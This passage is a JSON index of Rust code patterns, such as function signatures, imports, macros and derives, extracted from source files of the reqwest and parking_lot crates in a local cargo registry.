          "use percent_encoding::{self, AsciiSet, NON_ALPHANUMERIC};",
          "use futures_core::Stream;",
          "use futures_util::{future, stream, StreamExt};",
          "use super::Body;",
          "use crate::header::HeaderMap;",
          "use percent_encoding::utf8_percent_encode as percent_encode;",
          "use crate::util::fast_random as random;",
          "use super::*;",
          "use futures_util::TryStreamExt;",
          "use futures_util::{future, stream};",
          "use tokio::{self, runtime};"
        ],
        "macros": [
          "format!(\"--{}--\\r\\n\", self.boundary()).into()",
          "format!(\"--{}\\r\\n\", self.boundary()).into()",
          "format!(\"{a:016x}-{b:016x}-{c:016x}-{d:016x}\")",
          "assert!(out.unwrap().is_empty());",
          "println!(",
          "println!(\"START EXPECTED\\n{expected}\\nEND EXPECTED\");",
          "assert_eq!(std::str::from_utf8(&out).unwrap(), expected);",
          "println!(",
          "println!(\"START EXPECTED\\n{expected}\\nEND EXPECTED\");",
          "assert_eq!(std::str::from_utf8(&out).unwrap(), expected);",
          "assert_eq!(stream_part.value_len().unwrap(), stream_len as u64);",
          "assert_eq!(body_part.value_len().unwrap(), bytes_len as u64);",
          "assert_eq!(",
          "assert_eq!("
        ],
        "derives": [],
        "error_handling": 17
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/async_impl/decoder.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn plain_text(body: Body) -> Decoder {",
          "fn gzip(body: Body) -> Decoder {",
          "fn brotli(body: Body) -> Decoder {",
          "fn deflate(body: Body) -> Decoder {",
          "fn detect_encoding(headers: &mut HeaderMap, encoding_str: &str) -> bool {",
          "fn poll_next(mut self: Pin<&mut Self>, cx: &mut Context) -> Poll<Option<Self::Item>> {",
          "fn poll_data(",
          "fn poll_trailers(",
          "fn size_hint(&self) -> http_body::SizeHint {",
          "fn poll(mut self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<Self::Output> {",
          "fn poll_next(mut self: Pin<&mut Self>, cx: &mut Context) -> Poll<Option<Self::Item>> {",
          "fn is_gzip(&self) -> bool {",
          "fn is_brotli(&self) -> bool {",
          "fn is_deflate(&self) -> bool {",
          "fn default() -> Accepts {"
        ],
        "struct_defs": [
          "struct Pending(PeekableIoStream, DecoderType);",
          "struct IoStream(super::body::ImplStream);"
        ],
        "impl_blocks": [
          "impl fmt::Debug for Decoder {",
          "impl Decoder {",
          "impl Stream for Decoder {",
          "impl HttpBody for Decoder {",
          "impl Future for Pending {",
          "impl Stream for IoStream {",
          "impl Accepts {",
          "impl Default for Accepts {"
        ],
        "uses": [
          "use std::fmt;",
          "use std::future::Future;",
          "use std::pin::Pin;",
          "use std::task::{Context, Poll};",
          "use async_compression::tokio::bufread::GzipDecoder;",
          "use async_compression::tokio::bufread::BrotliDecoder;",
          "use async_compression::tokio::bufread::ZlibDecoder;",
          "use bytes::Bytes;",
          "use futures_core::Stream;",
          "use futures_util::stream::Peekable;",
          "use http::HeaderMap;",
          "use hyper::body::HttpBody;",
          "use tokio_util::codec::{BytesCodec, FramedRead};",
          "use tokio_util::io::StreamReader;",
          "use super::super::Body;",
          "use crate::error;",
          "use futures_util::StreamExt;",
          "use futures_util::StreamExt;",
          "use futures_util::StreamExt;",
          "use http::header::{CONTENT_ENCODING, CONTENT_LENGTH, TRANSFER_ENCODING};",
          "use log::warn;",
          "use futures_util::StreamExt;"
        ],
        "macros": [
          "warn!(\"{encoding_str} response with content-length of 0\");",
          "match futures_core::ready!(Pin::new(decoder).poll_next(cx)) {",
          "match futures_core::ready!(Pin::new(decoder).poll_next(cx)) {",
          "match futures_core::ready!(Pin::new(decoder).poll_next(cx)) {",
          "match futures_core::ready!(Pin::new(&mut self.0).poll_peek(cx)) {",
          "return Poll::Ready(Err(futures_core::ready!(",
          "match futures_core::ready!(Pin::new(&mut self.0).poll_next(cx)) {"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug)]"
        ],
        "error_handling": 10
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/async_impl/mod.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/blocking/response.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn body_mut(&mut self) -> Pin<&mut dyn futures_util::io::AsyncRead> {",
          "fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {",
          "fn from(r: http::Response<T>) -> Response {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl fmt::Debug for Response {",
          "impl Response {",
          "impl Read for Response {"
        ],
        "uses": [
          "use std::fmt;",
          "use std::io::{self, Read};",
          "use std::mem;",
          "use std::net::SocketAddr;",
          "use std::pin::Pin;",
          "use std::time::Duration;",
          "use bytes::Bytes;",
          "use http;",
          "use hyper::header::HeaderMap;",
          "use serde::de::DeserializeOwned;",
          "use super::client::KeepCoreThreadAlive;",
          "use super::wait;",
          "use crate::cookie;",
          "use crate::{async_impl, StatusCode, Url, Version};",
          "use futures_util::TryStreamExt;",
          "use futures_util::io::AsyncReadExt;"
        ],
        "macros": [
          "///     println!(\"success!\");",
          "///     println!(\"server error!\");",
          "///     println!(\"Something else happened. Status: {:?}\", resp.status());",
          "///     StatusCode::OK => println!(\"success!\"),",
          "///         println!(\"Request payload is too large!\");",
          "///     s => println!(\"Received response status: {s:?}\"),",
          "/// assert_eq!(resp.url().as_str(), \"http://httpbin.org/get\");",
          "/// println!(\"httpbin.org address: {:?}\", resp.remote_addr());",
          "/// println!(\"bytes: {bytes:?}\");",
          "/// assert_eq!(b\"abcde\", buf.as_slice());",
          "///     assert_eq!(err.status(), Some(reqwest::StatusCode::BAD_REQUEST));",
          "///     assert_eq!(err.status(), Some(reqwest::StatusCode::BAD_REQUEST));"
        ],
        "derives": [],
        "error_handling": 26
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/blocking/request.rs",
        "function_defs": [
          "fn header_sensitive<K, V>(mut self, key: K, value: V, sensitive: bool) -> RequestBuilder",
          "fn try_from(req: HttpRequest<T>) -> crate::Result<Self> {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt_request_fields<'a, 'b>(",
          "fn basic_get_request() {",
          "fn basic_head_request() {",
          "fn basic_post_request() {",
          "fn basic_put_request() {",
          "fn basic_patch_request() {",
          "fn basic_delete_request() {",
          "fn add_header() {",
          "fn add_headers() {",
          "fn add_headers_multi() {",
          "fn add_body() {",
          "fn add_query_append() {",
          "fn add_query_append_same() {",
          "fn add_query_struct() {",
          "fn add_query_map() {",
          "fn add_form() {",
          "fn add_json() {",
          "fn add_json_fail() {",
          "fn serialize<S>(&self, _serializer: S) -> Result<S::Ok, S::Error>",
          "fn test_replace_headers() {",
          "fn normalize_empty_query() {",
          "fn convert_url_authority_into_basic_auth() {",
          "fn convert_from_http_request() {",
          "fn set_http_request_version() {",
          "fn test_basic_auth_sensitive_header() {",
          "fn test_bearer_auth_sensitive_header() {"
        ],
        "struct_defs": [
          "struct Params {",
          "struct MyStruct;"
        ],
        "impl_blocks": [
          "impl Request {",
          "impl RequestBuilder {",
          "impl fmt::Debug for Request {",
          "impl Serialize for MyStruct {"
        ],
        "uses": [
          "use std::convert::TryFrom;",
          "use std::fmt;",
          "use std::time::Duration;",
          "use http::{request::Parts, Request as HttpRequest, Version};",
          "use serde::Serialize;",
          "use serde_json;",
          "use serde_urlencoded;",
          "use super::body::{self, Body};",
          "use super::multipart;",
          "use super::Client;",
          "use crate::header::{HeaderMap, HeaderName, HeaderValue, CONTENT_TYPE};",
          "use crate::{async_impl, Method, Url};",
          "use crate::header::CONTENT_LENGTH;",
          "use super::super::{body, Client};",
          "use super::{HttpRequest, Request, Version};",
          "use crate::header::{HeaderMap, HeaderValue, ACCEPT, CONTENT_TYPE, HOST};",
          "use crate::Method;",
          "use serde::Serialize;",
          "use serde_json;",
          "use serde_urlencoded;",
          "use std::collections::{BTreeMap, HashMap};",
          "use std::convert::TryFrom;",
          "use serde::ser::Error as _;",
          "use serde::{Serialize, Serializer};",
          "use std::error::Error as _;",
          "use http::HeaderMap;"
        ],
        "macros": [
          "let header_value = format!(\"Bearer {token}\");",
          "format!(\"multipart/form-data; boundary={}\", multipart.boundary()).as_str(),",
          "/// assert!(clone.is_some());",
          "/// assert!(clone.is_some());",
          "/// assert!(clone.is_none());",
          "assert_eq!(r.method(), &Method::GET);",
          "assert_eq!(r.url().as_str(), some_url);",
          "assert_eq!(r.method(), &Method::HEAD);",
          "assert_eq!(r.url().as_str(), some_url);",
          "assert_eq!(r.method(), &Method::POST);",
          "assert_eq!(r.url().as_str(), some_url);",
          "assert_eq!(r.method(), &Method::PUT);",
          "assert_eq!(r.url().as_str(), some_url);",
          "assert_eq!(r.method(), &Method::PATCH);",
          "assert_eq!(r.url().as_str(), some_url);",
          "assert_eq!(r.method(), &Method::DELETE);",
          "assert_eq!(r.url().as_str(), some_url);",
          "assert_eq!(r.headers().get(HOST), Some(&header));",
          "assert_eq!(r.headers(), &headers);",
          "assert_eq!(r.headers(), &headers);",
          "assert_eq!(all_values.next().unwrap(), &\"application/json\");",
          "assert_eq!(all_values.next().unwrap(), &\"application/xml\");",
          "assert_eq!(all_values.next(), None);",
          "assert_eq!(buf, body);",
          "assert_eq!(req.url().query(), Some(\"foo=bar&qux=3\"));",
          "assert_eq!(req.url().query(), Some(\"foo=a&foo=b\"));",
          "assert_eq!(req.url().query(), Some(\"foo=bar&qux=3\"));",
          "assert_eq!(req.url().query(), Some(\"foo=bar&qux=three\"));",
          "assert_eq!(",
          "assert_eq!(buf, body_should_be);",
          "assert_eq!(r.headers().get(CONTENT_TYPE).unwrap(), &\"application/json\");",
          "assert_eq!(buf, body_should_be);",
          "assert!(err.is_builder()); // well, duh ;)",
          "assert!(err.source().unwrap().is::<serde_json::Error>());",
          "assert_eq!(req.headers()[\"im-a\"], \"keeper\");",
          "assert_eq!(foo.len(), 2);",
          "assert_eq!(foo[0], \"bar\");",
          "assert_eq!(foo[1], \"baz\");",
          "assert_eq!(req.url().query(), None);",
          "assert_eq!(req.url().as_str(), \"https://google.com/\");",
          "assert_eq!(req.url().as_str(), \"https://localhost/\");",
          "assert_eq!(",
          "assert_eq!(req.body().is_none(), false);",
          "assert_eq!(req.body().unwrap().as_bytes(), Some(&test_data[..]));",
          "assert_eq!(headers.get(\"User-Agent\").unwrap(), \"my-awesome-agent/1.0\");",
          "assert_eq!(req.method(), Method::GET);",
          "assert_eq!(req.url().as_str(), \"http://localhost/\");",
          "assert_eq!(req.body().is_none(), false);",
          "assert_eq!(req.body().unwrap().as_bytes(), Some(&test_data[..]));",
          "assert_eq!(headers.get(\"User-Agent\").unwrap(), \"my-awesome-agent/1.0\");",
          "assert_eq!(req.method(), Method::GET);",
          "assert_eq!(req.url().as_str(), \"http://localhost/\");",
          "assert_eq!(req.version(), Version::HTTP_11);",
          "assert_eq!(req.url().as_str(), \"https://localhost/\");",
          "assert_eq!(",
          "assert_eq!(req.headers()[\"authorization\"].is_sensitive(), true);",
          "assert_eq!(req.url().as_str(), \"https://localhost/\");",
          "assert_eq!(req.headers()[\"authorization\"], \"Bearer Hold my bear\");",
          "assert_eq!(req.headers()[\"authorization\"].is_sensitive(), true);"
        ],
        "derives": [
          "#[derive(Debug)]",
          "#[derive(Serialize)]"
        ],
        "error_handling": 56
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/blocking/wait.rs",
        "function_defs": [
          "fn wake_by_ref(arc_self: &Arc<Self>) {",
          "fn enter() {"
        ],
        "struct_defs": [
          "struct ThreadWaker(Thread);"
        ],
        "impl_blocks": [
          "impl futures_util::task::ArcWake for ThreadWaker {"
        ],
        "uses": [
          "use std::future::Future;",
          "use std::sync::Arc;",
          "use std::task::{Context, Poll};",
          "use std::thread::{self, Thread};",
          "use std::time::Duration;",
          "use tokio::time::Instant;"
        ],
        "macros": [
          "log::trace!(\"wait at most {d:?}\");",
          "futures_util::pin_mut!(fut);",
          "log::trace!(\"wait timeout exceeded\");",
          "log::trace!(",
          "log::trace!(\"({:?}) park without timeout\", thread::current().id());"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/blocking/client.rs",
        "function_defs": [
          "fn default() -> Self {",
          "fn with_inner<F>(mut self, func: F) -> ClientBuilder",
          "fn from(builder: async_impl::ClientBuilder) -> Self {",
          "fn default() -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn drop(&mut self) {",
          "fn new(builder: ClientBuilder) -> crate::Result<ClientHandle> {",
          "fn execute_request(&self, req: Request) -> crate::Result<Response> {",
          "fn default() -> Timeout {",
          "fn event_loop_panicked() -> ! {"
        ],
        "struct_defs": [
          "struct ClientHandle {",
          "struct InnerClientHandle {",
          "struct Timeout(Option<Duration>);"
        ],
        "impl_blocks": [
          "impl Default for ClientBuilder {",
          "impl ClientBuilder {",
          "impl From<async_impl::ClientBuilder> for ClientBuilder {",
          "impl Default for Client {",
          "impl Client {",
          "impl fmt::Debug for Client {",
          "impl fmt::Debug for ClientBuilder {",
          "impl Drop for InnerClientHandle {",
          "impl ClientHandle {",
          "impl Default for Timeout {",
          "impl KeepCoreThreadAlive {"
        ],
        "uses": [
          "use std::any::Any;",
          "use std::convert::TryInto;",
          "use std::fmt;",
          "use std::future::Future;",
          "use std::net::IpAddr;",
          "use std::net::SocketAddr;",
          "use std::sync::Arc;",
          "use std::thread;",
          "use std::time::Duration;",
          "use http::header::HeaderValue;",
          "use log::{error, trace};",
          "use tokio::sync::{mpsc, oneshot};",
          "use super::request::{Request, RequestBuilder};",
          "use super::response::Response;",
          "use super::wait;",
          "use crate::tls;",
          "use crate::Certificate;",
          "use crate::Identity;",
          "use crate::{async_impl, header, redirect, IntoUrl, Method, Proxy};",
          "use tokio::runtime;",
          "use std::task::Poll;"
        ],
        "macros": [
          "/// static APP_USER_AGENT: &str = concat!(",
          "///     env!(\"CARGO_PKG_NAME\"),",
          "///     env!(\"CARGO_PKG_VERSION\"),",
          "trace!(\"closing runtime thread ({id:?})\");",
          "trace!(\"signaled close for runtime thread ({id:?})\");",
          "trace!(\"closed runtime thread ({id:?})\");",
          "error!(\"Failed to communicate runtime creation failure: {e:?}\");",
          "error!(\"Failed to communicate client creation failure: {e:?}\");",
          "error!(\"Failed to communicate successful startup: {e:?}\");",
          "trace!(\"({:?}) Receiver is shutdown\", thread::current().id());",
          "trace!(\"({:?}) start runtime::block_on\", thread::current().id());",
          "trace!(\"({:?}) end runtime::block_on\", thread::current().id());",
          "trace!(\"({:?}) finished\", thread::current().id());",
          "futures_util::pin_mut!(fut);",
          "futures_core::ready!(tx.poll_closed(cx));",
          "panic!(\"event loop thread panicked\");"
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Clone)]",
          "#[derive(Clone, Copy)]"
        ],
        "error_handling": 30
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/blocking/body.rs",
        "function_defs": [
          "fn try_clone(&self) -> Option<Kind> {",
          "fn from(v: Vec<u8>) -> Body {",
          "fn from(s: String) -> Body {",
          "fn from(s: &'static [u8]) -> Body {",
          "fn from(s: &'static str) -> Body {",
          "fn from(f: File) -> Body {",
          "fn from(b: Bytes) -> Body {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {"
        ],
        "struct_defs": [
          "struct DebugLength<'a>(&'a Option<u64>);"
        ],
        "impl_blocks": [
          "impl Body {",
          "impl Kind {",
          "impl From<Vec<u8>> for Body {",
          "impl From<String> for Body {",
          "impl From<&'static [u8]> for Body {",
          "impl From<&'static str> for Body {",
          "impl From<File> for Body {",
          "impl From<Bytes> for Body {",
          "impl fmt::Debug for Kind {",
          "impl Read for Reader {",
          "impl Sender {"
        ],
        "uses": [
          "use std::fmt;",
          "use std::fs::File;",
          "use std::future::Future;",
          "use std::io::Cursor;",
          "use std::io::{self, Read};",
          "use std::mem;",
          "use std::ptr;",
          "use bytes::buf::UninitSlice;",
          "use bytes::Bytes;",
          "use crate::async_impl;",
          "use bytes::{BufMut, BytesMut};",
          "use std::cmp;"
        ],
        "macros": [],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 16
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/blocking/multipart.rs",
        "function_defs": [
          "fn default() -> Self {",
          "fn with_inner<F>(self, func: F) -> Self",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn new(value: Body) -> Part {",
          "fn mime(self, mime: Mime) -> Part {",
          "fn with_inner<F>(self, func: F) -> Self",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn value_len(&self) -> Option<u64> {",
          "fn metadata(&self) -> &PartMetadata {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn new(form: Form) -> Reader {",
          "fn next_reader(&mut self) {",
          "fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {",
          "fn form_empty() {",
          "fn read_to_end() {",
          "fn read_to_end_with_length() {",
          "fn read_to_end_with_header() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Default for Form {",
          "impl Form {",
          "impl fmt::Debug for Form {",
          "impl Part {",
          "impl fmt::Debug for Part {",
          "impl PartProps for Part {",
          "impl fmt::Debug for Reader {",
          "impl Reader {",
          "impl Read for Reader {"
        ],
        "uses": [
          "use std::borrow::Cow;",
          "use std::fmt;",
          "use std::fs::File;",
          "use std::io::{self, Cursor, Read};",
          "use std::path::Path;",
          "use mime_guess::{self, Mime};",
          "use super::Body;",
          "use crate::async_impl::multipart::{FormParts, PartMetadata, PartProps};",
          "use crate::header::HeaderMap;",
          "use super::*;"
        ],
        "macros": [
          "let boundary = Cursor::new(format!(\"--{}\\r\\n\", self.form.boundary()));",
          "Some(Box::new(reader.chain(Cursor::new(format!(",
          "assert_eq!(output, b\"\");",
          "assert_eq!(length.unwrap(), 0);",
          "println!(",
          "println!(\"START EXPECTED\\n{expected}\\nEND EXPECTED\");",
          "assert_eq!(std::str::from_utf8(&output).unwrap(), expected);",
          "assert!(length.is_none());",
          "println!(",
          "println!(\"START EXPECTED\\n{expected}\\nEND EXPECTED\");",
          "assert_eq!(std::str::from_utf8(&output).unwrap(), expected);",
          "assert_eq!(length.unwrap(), expected.len() as u64);",
          "println!(",
          "println!(\"START EXPECTED\\n{expected}\\nEND EXPECTED\");",
          "assert_eq!(std::str::from_utf8(&output).unwrap(), expected);"
        ],
        "derives": [],
        "error_handling": 24
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/blocking/mod.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "//! println!(\"body = {body:?}\");"
        ],
        "derives": [],
        "error_handling": 7
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/wasm/response.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Response {",
          "impl fmt::Debug for Response {"
        ],
        "uses": [
          "use std::fmt;",
          "use bytes::Bytes;",
          "use http::{HeaderMap, StatusCode};",
          "use js_sys::Uint8Array;",
          "use url::Url;",
          "use crate::wasm::AbortGuard;",
          "use wasm_bindgen::JsCast;",
          "use futures_util::stream::StreamExt;",
          "use serde::de::DeserializeOwned;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 9
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/wasm/request.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt_request_fields<'a, 'b>(",
          "fn try_from(req: HttpRequest<T>) -> crate::Result<Self> {",
          "fn try_from(req: Request) -> crate::Result<Self> {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Request {",
          "impl RequestBuilder {",
          "impl fmt::Debug for Request {",
          "impl fmt::Debug for RequestBuilder {",
          "impl TryFrom<Request> for HttpRequest<Body> {"
        ],
        "uses": [
          "use std::convert::TryFrom;",
          "use std::fmt;",
          "use bytes::Bytes;",
          "use http::{request::Parts, Method, Request as HttpRequest};",
          "use serde::Serialize;",
          "use serde_json;",
          "use url::Url;",
          "use web_sys::RequestCredentials;",
          "use super::{Body, Client, Response};",
          "use crate::header::{HeaderMap, HeaderName, HeaderValue, CONTENT_TYPE};"
        ],
        "macros": [
          "let header_value = format!(\"Bearer {token}\");",
          "/// assert!(clone.is_some());"
        ],
        "derives": [],
        "error_handling": 14
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/wasm/client.rs",
        "function_defs": [
          "fn fetch_with_request(input: &web_sys::Request) -> Promise;",
          "fn js_fetch(req: &web_sys::Request) -> Promise {",
          "fn merge_headers(&self, req: &mut Request) {",
          "fn default() -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn default() -> Self {",
          "fn default() -> Config {",
          "fn fmt_fields(&self, f: &mut fmt::DebugStruct<'_, '_>) {",
          "fn user_agent_header() {"
        ],
        "struct_defs": [
          "struct Config {"
        ],
        "impl_blocks": [
          "impl Client {",
          "impl Default for Client {",
          "impl fmt::Debug for Client {",
          "impl fmt::Debug for ClientBuilder {",
          "impl ClientBuilder {",
          "impl Default for ClientBuilder {",
          "impl Default for Config {",
          "impl Config {"
        ],
        "uses": [
          "use http::header::USER_AGENT;",
          "use http::{HeaderMap, HeaderValue, Method};",
          "use js_sys::{Promise, JSON};",
          "use std::convert::TryInto;",
          "use std::{fmt, future::Future, sync::Arc};",
          "use url::Url;",
          "use wasm_bindgen::prelude::{wasm_bindgen, UnwrapThrowExt as _};",
          "use super::{AbortGuard, Request, RequestBuilder, Response};",
          "use crate::IntoUrl;",
          "use wasm_bindgen::{JsCast, JsValue};",
          "use http::header::Entry;",
          "use wasm_bindgen_test::*;",
          "use crate::header::{HeaderMap, HeaderValue, CONTENT_TYPE};",
          "use crate::header::{HeaderMap, HeaderValue, CONTENT_TYPE};",
          "use crate::header::USER_AGENT;"
        ],
        "macros": [
          "wasm_bindgen_test::wasm_bindgen_test_configure!(run_in_browser);",
          "assert!(test_headers.get(CONTENT_TYPE).is_some(), \"content-type\");",
          "assert!(test_headers.get(\"x-custom\").is_some(), \"custom header\");",
          "assert!(test_headers.get(\"accept\").is_none(), \"no accept header\");",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!("
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 12
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/wasm/body.rs",
        "function_defs": [
          "fn as_bytes(&self) -> &[u8] {",
          "fn is_empty(&self) -> bool {",
          "fn from(bytes: Bytes) -> Body {",
          "fn from(vec: Vec<u8>) -> Body {",
          "fn from(s: &'static [u8]) -> Body {",
          "fn from(s: String) -> Body {",
          "fn from(s: &'static str) -> Body {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn log(s: String);"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Single {",
          "impl Body {",
          "impl From<Bytes> for Body {",
          "impl From<Vec<u8>> for Body {",
          "impl From<&'static [u8]> for Body {",
          "impl From<String> for Body {",
          "impl From<&'static str> for Body {",
          "impl fmt::Debug for Body {"
        ],
        "uses": [
          "use super::multipart::Form;",
          "use bytes::Bytes;",
          "use js_sys::Uint8Array;",
          "use std::{borrow::Cow, fmt};",
          "use wasm_bindgen::JsValue;",
          "use crate::Body;",
          "use js_sys::Uint8Array;",
          "use wasm_bindgen::prelude::*;",
          "use wasm_bindgen_test::*;"
        ],
        "macros": [
          "wasm_bindgen_test::wasm_bindgen_test_configure!(run_in_browser);",
          "assert_eq!([84, 69, 83, 84], body.as_bytes().unwrap());",
          "assert_eq!(text.as_string().expect(\"text is not a string\"), body_value);",
          "assert_eq!(text.as_string().expect(\"text is not a string\"), body_value);",
          "assert_eq!(v, body_value);",
          "assert_eq!(v, body_value);"
        ],
        "derives": [
          "#[derive(Clone)]"
        ],
        "error_handling": 11
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/reqwest-0.11.27/src/wasm/multipart.rs",
        "function_defs": [
          "fn metadata(&self) -> &PartMetadata;",
          "fn default() -> Self {",
          "fn with_inner<F>(self, func: F) -> Self",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn new(value: Body) -> Part {",
          "fn mime(self, mime: Mime) -> Part {",
          "fn with_inner<F>(self, func: F) -> Self",
          "fn append_to_form(",
          "fn blob(&self, mime_type: Option<&Mime>) -> crate::Result<web_sys::Blob> {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn metadata(&self) -> &PartMetadata {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Form {",
          "impl Default for Form {",
          "impl Form {",
          "impl fmt::Debug for Form {",
          "impl Part {",
          "impl fmt::Debug for Part {",
          "impl PartProps for Part {",
          "impl PartMetadata {",
          "impl PartMetadata {"
        ],
        "uses": [
          "use std::borrow::Cow;",
          "use std::fmt;",
          "use http::HeaderMap;",
          "use mime_guess::Mime;",
          "use web_sys::FormData;",
          "use super::Body;",
          "use web_sys::Blob;",
          "use web_sys::BlobPropertyBag;",
          "use wasm_bindgen_test::*;",
          "use super::{Form, Part};",
          "use js_sys::Uint8Array;",
          "use wasm_bindgen::JsValue;",
          "use web_sys::{File, FormData};"
        ],
        "macros": [
          "wasm_bindgen_test::wasm_bindgen_test_configure!(run_in_browser);",
          "assert_eq!(text_file.name(), text_file_name);",
          "assert_eq!(text_file.type_(), text_file_type);",
          "assert_eq!(",
          "assert_eq!(binary_file.name(), binary_file_name);",
          "assert_eq!(binary_file.type_(), binary_file_type);",
          "assert_eq!(string, string_content);",
          "assert_eq!(binary, binary_content);"
        ],
        "derives": [],
        "error_handling": 6
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5",
    "name": "parking_lot-0.12.5",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5/tests/issue_203.rs",
        "function_defs": [
          "fn drop(&mut self) {",
          "fn main() {"
        ],
        "struct_defs": [
          "struct Bar(RwLock<()>);"
        ],
        "impl_blocks": [
          "impl Drop for Bar {"
        ],
        "uses": [
          "use parking_lot::RwLock;",
          "use std::thread;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5/tests/issue_392.rs",
        "function_defs": [
          "fn issue_392() {"
        ],
        "struct_defs": [
          "struct Lock(RwLock<i32>);"
        ],
        "impl_blocks": [],
        "uses": [
          "use parking_lot::RwLock;"
        ],
        "macros": [
          "println!(\"lock upgrade\");",
          "println!(\"lock upgrade\");"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5/src/condvar.rs",
        "function_defs": [
          "fn notify_one_slow(&self, mutex: *mut RawMutex) -> bool {",
          "fn notify_all_slow(&self, mutex: *mut RawMutex) -> usize {",
          "fn wait_until_internal(&self, mutex: &RawMutex, timeout: Option<Instant>) -> WaitTimeoutResult {",
          "fn wait_while_until_internal<T, F>(",
          "fn default() -> Condvar {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn smoke() {",
          "fn notify_one() {",
          "fn notify_all() {",
          "fn notify_one_return_true() {",
          "fn notify_one_return_false() {",
          "fn notify_all_return() {",
          "fn wait_for() {",
          "fn wait_until() {",
          "fn spawn_wait_while_notifier(",
          "fn wait_while_until_internal_does_not_wait_if_initially_false() {",
          "fn wait_while_until_internal_times_out_before_false() {",
          "fn wait_while_until_internal() {",
          "fn two_mutexes() {",
          "fn drop(&mut self) {",
